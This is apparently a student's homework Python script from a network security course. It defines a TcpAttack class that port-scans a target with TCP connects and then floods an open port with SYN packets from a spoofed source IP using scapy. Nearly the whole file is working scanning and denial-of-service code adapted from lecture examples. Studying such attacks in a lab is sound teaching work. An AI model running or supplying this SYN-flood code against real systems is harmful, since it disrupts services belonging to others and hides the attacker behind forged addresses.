'''
Homework Number: 8
Name: Alex Goebel
ECN Login: goebel2
Due Date: 3/30/2021
'''

#!/usr/bin/env python3

import sys, socket
import re
import os.path
from scapy.all import *


class TcpAttack:
    
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.ports = []
        
    
    
    #rangeStart: Integer designating the first port in the range of ports being scanned.
    #rangeEnd: Integer designating the last port in the range of ports being scanned
    #No return value, but writes open ports to openports.txt
    #Code was used from port_scan.py from Lecture 16 and modified to fit this assignment. dst_host changed to self.targetIP, start_port changed to rangeStart, and end_port changed to rangeEnd
    def scanTarget(self, rangeStart, rangeEnd):
        verbosity = 0;        # set it to 1 if you want to see the result for each   #(1)
                              # port separately as the scan is taking place

        #dst_host = sys.argv[1]                                                       #(2)
        #rangeStart = int(sys.argv[2])                                                #(3)
        #rangeEnd = int(sys.argv[3])                                                  #(4)
        
        open_ports = []                                                              #(5)
        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd+1):                               #(6)
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
            sock.settimeout(0.1)                                                     #(8)
            try:                                                                     #(9)
                sock.connect( (self.targetIP, testport) )                                 #(10)
                open_ports.append(testport)                                          #(11)
                if verbosity: print (testport)                                        #(12)
                sys.stdout.write("%s" % testport)                                    #(13)
                sys.stdout.flush()                                                   #(14)
            except:                                                                  #(15)
                if verbosity: print ("Port closed: ", testport)                        #(16)
                sys.stdout.write(".")                                                #(17)
                sys.stdout.flush()                                                   #(18)
        
        # Now scan through the /etc/services file, if available, so that we can
        # find out what services are provided by the open ports.  The goal here
        # is to construct a dict whose keys are the port names and the values
        # the corresponding lines from the file that are "cleaned up" for
        # getting rid of unwanted white space:
        service_ports = {}
        if os.path.exists( "/etc/services" ):                                        #(19)
            IN = open("/etc/services")                                               #(20)
            for line in IN:                                                          #(21)
                line = line.strip()                                                  #(22)
                if line == '': continue                                              #(23)
                if (re.match( r'^\s*#' , line)): continue                            #(24)
                entries = re.split(r'\s+', line)                                     #(25)
                service_ports[ entries[1] ] =  ' '.join(re.split(r'\s+', line))      #(26)
            IN.close()                                                               #(27)
            
        OUT = open("openports.txt", 'w')                                             #(28)
        if not open_ports:                                                           #(29)
            print ("\n\nNo open ports in the range specified\n")                       #(30)    
        else:
            print ("\n\nThe open ports:\n\n")                                         #(31)    
            for k in range(0, len(open_ports)):                                      #(32)
                if len(service_ports) > 0:                                           #(33)
                    for portname in sorted(service_ports):                           #(34)
                        pattern = r'^' + str(open_ports[k]) + r'/'                   #(35)
                        if re.search(pattern, str(portname)):                        #(36)
                            print ("%d:    %s" %(open_ports[k], service_ports[portname]))
                                                                                     #(37)
                else:
                    self.ports = open_ports
                    print (open_ports[k])                                              #(38)
                OUT.write("%s\n" % open_ports[k])                                    #(39)
        OUT.close()                                                                  #(40)
        print("Scan Target called")
        
    
    #port: Integer designating the port that the attack will use
    #numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise, return 0.
    #This method was taken from DoS5.py from Lecture 16 and modified for this assignment
    def attackTarget(self, port, numSyn):
        
        for x in self.ports:
            if x == port:
                sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
                sock.settimeout(0.1)
                try:                                                                     #(9)
                    sock.connect((self.targetIP, port)  )                              #(10)
                except:           
                    print("Port closed, exiting with status 0")                     #(15)
                    return 0
                srcIP    = self.spoofIP                                                       #(1)
                destIP   = self.targetIP                                                       #(2)
                destPort = port                                                  #(3)
                for i in range(0, numSyn):
                    IP_header = IP(src = srcIP, dst = destIP)                                #(6)
                    TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
                    packet = IP_header / TCP_header                                          #(8)
                    try:                                                                     #(9)
                       send(packet)                                                          #(10)
                    except Exception as e:                                                   #(11)
                       print (e)                                                               #(11)
                print("Attack Target called")
                return 1
            
        return 0